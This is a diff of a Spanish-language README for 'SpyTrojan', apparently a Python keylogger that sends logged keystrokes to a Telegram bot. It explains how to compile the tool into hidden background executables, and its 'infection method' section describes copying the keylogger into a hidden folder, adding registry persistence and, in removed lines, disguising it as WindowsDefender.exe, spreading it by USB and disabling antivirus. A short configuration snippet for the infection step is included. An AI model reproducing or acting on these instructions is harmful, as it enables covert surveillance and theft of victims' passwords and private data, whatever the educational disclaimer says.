@@ -4,7 +4,8 @@
 ````
 
 ---
-# __¡ Nota importante !:__ Ésta herramienta tiene como único proposito general, el aprendizaje de ___"Seguridad en sistemas informáticos"___, el creador no se hace responsable por un posible mal uso de ésta herramienta.
+# __¡ Nota importante !:__ 
+## Ésta herramienta tiene como único proposito general, el aprendizaje de ___"Seguridad en sistemas informáticos"___, el creador no se hace responsable por un posible mal uso de ésta herramienta.
 ---
 
 
@@ -25,8 +26,6 @@
 * __Documentation date:__ `11/12/20`
 * __Description:__ `Advanced Keylogger | send Telegram bot  `
 
-
-# __¡ Nota importante !:__ Ésta documentación está en proceso de escritura... algunos datos no están completas
 
 <!--#region Carpeta Principal  -->
 # Carpeta Principal
@@ -101,6 +100,8 @@ El programa se repite 2 veces ya que ésta utiza 2 hilos de ejecución
 
 # Proceso de preparación:
 
+__NOTA:__ Como requisito mínimo para el aprendizaje de ésta herramienta es saber programar en __Python básico__.
+
 <!--#region Instalar todos los requerimientos -->
 ## 1. Instalar todos los requerimientos
 
@@ -130,10 +131,6 @@ El programa se repite 2 veces ya que ésta utiza 2 hilos de ejecución
 
     ![iniciando bot](https://i.imgur.com/1r9F2IU.png)
 
-6. Ejemplo del funcionamiento
-
-    ![Ejemplo de funcionamiento telegram](https://i.imgur.com/QHLYDi9.png)
-
 <!--#endregion -->
 
 <!--#region Crear ejecutable del `SpyTrojan.py -->
@@ -144,7 +141,7 @@ El programa se repite 2 veces ya que ésta utiza 2 hilos de ejecución
     ![lista de requerimientos](https://imgur.com/7KYSyiY.png)
 
     <details>
-            <summary> Click para ver el contenido del archivo.</summary>
+    <summary> Click para ver el contenido del archivo.</summary>
 
     ````r
     VSVersionInfo(
@@ -186,13 +183,39 @@ El programa se repite 2 veces ya que ésta utiza 2 hilos de ejecución
 
 * __Paso 2:__  Convertir *.py a *.exe
 
+    <details>
+    <summary> Click para ver más información</summary>
+
     ![](https://imgur.com/1M7P0aW.png)
 
-    <p>El archivo <code># Create .EXE [SpyTrojan]-[Debug].bat</code> nos dará como resultado un *.exe pero al ejecutar el programa se mostrará la consola, con la finalidad de debuggear el programa</p>
-    <p> El archivo <code># Create .EXE [SpyTrojan]-[Release].bat</code> es el software final, está se ejeuctará en segundo plano sin entorno grafico o consola. </p>
-    <br>
-    <b>El ejecutable resultante se guardará en una carpeta con los nombres <code>[DEBUG]</code>, <code>[RELEASE]</code> según sea el caso.</b>
- 
+    El archivo `# Create .EXE [SpyTrojan]-[Debug].bat` nos dará como resultado un *.exe pero al ejecutar el programa se mostrará la consola, con la finalidad de debuggear: 
+    - Mensaje de Error o Exito de Screenshot
+    - Teclas oprimidas a tiempo real
+    - Mensaje de Error o Exito al conectarse al Bot
+    - Mensaje de Error o Exito al envíar el registro mediante Telegram medíante un ID
+    - Otros posibles errores de __`import lib`__
+
+        ![mensajes de debug](https://i.imgur.com/1jfgC0O.png)
+
+
+    - El archivo <code># Create .EXE [InfectionFile]-[Release].bat</code> es el software final, está se ejeuctará en segundo plano sin entorno grafico o consola.
+    
+    - El ejecutable resultante se guardará en una carpeta con los nombres <code>[DEBUG]</code>, <code>[RELEASE]</code> según sea el caso.
+
+        ![Compile ejecutandose](https://i.imgur.com/weGPkTn.png)
+
+    - Luego de terminar aparecerá en la consola `Press any key to continue...`
+
+        ![Complile.bat terminado](https://i.imgur.com/GHBtZKI.png)
+
+    - Regresamos a la carpeta principal y notamos que tenemos nuevas carpetas y archivos, las cuales son archivos caché sin ninguna importancia, donde e encuentrá nuestro software es dentro de la carpeta `[DEBUG]` o `[RELEASE]`.
+
+    - Compilación terminada:
+
+        ![](https://i.imgur.com/V0MI65n.png)
+
+    </details> 
+
 
 * __Nota:__  Al abrir el *.exe resultante, ésta mandará error lo cuál es normal ya que el software lee información del registro `[REGEDIT]`, información que todavía no se han creado.
 
@@ -362,7 +385,7 @@ según estos datos, el software funcionará de una u otra manera.
     ![lista de requerimientos](https://imgur.com/q79rmJb.png)
 
     <details>
-            <summary> Click para ver el contenido del archivo.</summary>
+    <summary> Click para ver el contenido del archivo.</summary>
 
     ````r
     VSVersionInfo(
@@ -404,84 +427,73 @@ según estos datos, el software funcionará de una u otra manera.
 
 * __Paso 9:__  Convertir *.py a *.exe
 
-    ![](https://imgur.com/1M7P0aW.png)
+    <details>
+    <summary> Click para ver más información</summary>
 
-    <p>El archivo <code># Create .EXE [InfectionFile]-[Debug].bat</code> nos dará como resultado un *.exe pero al ejecutar el programa se mostrará la consola, con la finalidad de debuggear el programa</p>
-    <p> El archivo <code># Create .EXE [InfectionFile]-[Release].bat</code> es el software final, está se ejeuctará en segundo plano sin entorno grafico o consola. </p>
-    <br>
-    <b>El ejecutable resultante se guardará en una carpeta con los nombres <code>[DEBUG]</code>, <code>[RELEASE]</code> según sea el caso.</b>
+    ![](https://imgur.com/uWv4Vq2.png)
+
+    El archivo `# Create .EXE [InfectionFile]-[Debug].bat` nos dará como resultado un *.exe pero al ejecutar el programa se mostrará la consola, con la finalidad de debuggear: 
+    - Mensaje de Error o Exito escritura del registro
+    - Mensaje de Error o Exito de replicar software en el sistema
+    - Otros posibles errores de __`import lib`__
+
+        ![mensajes de debug](https://i.imgur.com/1jfgC0O.png)
+
+
+    - El archivo <code># Create .EXE [InfectionFile]-[Release].bat</code> es el software final, está se ejeuctará en segundo plano sin entorno grafico o consola.
+    
+    - El ejecutable resultante se guardará en una carpeta con los nombres <code>[DEBUG]</code>, <code>[RELEASE]</code> según sea el caso.
+
+        ![Compile ejecutandose](https://i.imgur.com/weGPkTn.png)
+
+    - Luego de terminar aparecerá en la consola `Press any key to continue...`
+
+        ![Complile.bat terminado](https://i.imgur.com/GHBtZKI.png)
+
+    - Regresamos a la carpeta principal y notamos que tenemos nuevas carpetas y archivos, las cuales son archivos caché sin ninguna importancia, donde e encuentrá nuestro software es dentro de la carpeta `[DEBUG]` o `[RELEASE]`.
+
+    - Compilación terminada:
+
+        ![](https://i.imgur.com/V0MI65n.png)
+
+</details> 
 
 <!--#endregion -->
 
+<!--#region Método de infección -->
+# Método de infección
 
-__NOTA:__ Como requisito mínimo para el aprendizaje de ésta herramienta es saber programar en __Python básico__.
-
-
-
-# Modo Debugger
-Si ya configuró o bien la base de datos, Gmail o Telegram, si deseas saber si todo está Ok, pues ejecuta el archivo `Ejecuta.bat`, esta ejecutará el `SpyTrojanKeylogger.py` en modo debugg, la cual mostrará información en la consola:
-- Mensaje de Error o Exito de __[StartUp]__ 
-- Mensaje de Error o Exito de la caracteristica __`Trojan`__
-- Teclas oprimidas a tiempo real
-- Mensaje de Error o Exito al envía el registro por Gmail
-- Mensaje de Error o Exito al conectarse con la base de datos.
-- Mensaje de Error o Exito al envíar el registro mediante Telegram
-- Otros posibles errores de __`import lib`__
-
- __[Si tiene problemas con las librerías intenta reinstalar python e instalar las librerías manualmente.]__
-
-![asd](https://i.imgur.com/1jfgC0O.png)
-
-# Convertir `*.py` a `*.exe`
-Una vez todo configurado, lo siguiente es convertir nuestro archivo `py` a un `exe`  y en el proceso disfrazarlo.
-
-- Ejecutamos el archivo:
-    
-    ![Compile.bat](https://i.imgur.com/RU12Dsy.png)
-
-    ![Compile ejecutandose](https://i.imgur.com/weGPkTn.png)
-
-- Luego de terminar aparecerá en la consola `Press any key to continue...`
-
-    ![Complile.bat terminado](https://i.imgur.com/GHBtZKI.png)
-- Regresamos a la carpeta principal y notamos que tenemos nuevas carpetas y archivos, las cuales son archivos caché sin ninguna importancia, donde e encuentrá nuestro troyano es dentro de la carpeta `EXE Final`.
-
-    ![Carpeta final](https://i.imgur.com/ljoZLXJ.png)
-
-- Compilación terminada:
-
-    ![](https://i.imgur.com/V0MI65n.png)
-
+<!--#endregion -->
 
 # Método de infección:
-___¿Cómo infecto a la victima?___
+- Colocamos en una carpeta los dos ejecutables que compilamos
+- `InfectionFile.exe` y `StyTrojan.exe`
+- `StyTrojan.exe` : Es el keylogger 
+- `InfectionFile.exe`: Este archivo se encarga de escribir la configuracion en el registro de Windows y copiar nuestro archivo  `StyTrojan.exe` a una carpeta oculta en el sistema.
+- Ejecutamos `InfectionFile.exe` y este se encargará de todo el trabajo
+- Es importante que el nombre de nuestro keylogger sea exactamente igual en la cual colocamos en la configuración 
 
-![Final files](https://i.imgur.com/TlBEAaS.png)
+    <details>
+    <summary> Click para ver más información</summary>
+    
+    ![](https://imgur.com/IVJl4NH.png)
 
-__Nota:__ No cambiar de nombre al archivo `WindowsDefender.exe`, si usted le cambia el nombre, el Keylogger quedará obsoleto.
-- Usten guardará el archivo en un USB.
-- Conectará el __USB__ a la __[PC]__ a infectar.
-- Se recomienda desactivar el antivirus o agregar una exclusión en al siguiente ruta: `"C:\Users\Public\Security\Windows Defender"`.
-- Lo siguiente es ejecutar el archivo `WindowsDefender.exe` en el USB, el Keylogger se replicará en la siguiente ruta `"C:\Users\Public\Security\Windows Defender"`, Se recomienda no sacar el USB al instante ya que el `Keylogger` se estará replicando en la ruta.
+    ````py
+    trojan = Trojan(path_registry=r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide',
+                        debug=0,    # No disposible en ésta versión
+                        delay=0,    # No disposible en ésta versión
+                        path_software='C:\\Users\\' + str(os.getlogin()) + r'\AppData\Local\Microsoft\Windows\Shell\temp', # No cambiar
+                        name_software= 'SpyTrojan.exe', # <= Ingrese el nombre del exe generado anteriormente:
+                        # Ejemplo: "SpyKeylogger.exe"
+                        username=str(os.getlogin()) # No cambiar
+                        )
+        trojan.set_values()
+        trojan.infection()
+    ````
 
-__NOTA:__ Al ejecutar el archivó, ésta automaticamente modificará el registro de windows para que se inicie siempre al prender la computadora.
+</details>
 
-El Keylogger modificará la siguiente ruta del registro `"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"` por lo cual necesitará permisos de administrador, por ende se recomienda que la primera ejecución se realice con permisos de administrador, en caso de que no lo ejecute con permisos de administrador, el Keylogger modificará la siguiente ruta `"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"`
 
-__Explicación:__ 
-* `HKEY_LOCAL_MACHINE:` El Keylogger se ejecutará en todos los usuarios exitentes y los nuevos usuarios de la computadora
-* `HKEY_CURRENT_USER:` El Keylogger solo se ejecutará en el usuario actual, si se llegará a crear otro usuario, el Keylogger Solo funcionará en el usuario principal
-<!-- Creador  -->
----
-
-## Lista de Cambios de la Verión 5 al 6
-````r
-[-] Se eliminó soporte de envio mediante una conexión a base de datos
-[-] Se eliminó soporte de envio mediante Gmail
-[-] 
-[+]
-
-````
 
 
 ## Bibliotecas personales utilizadas:
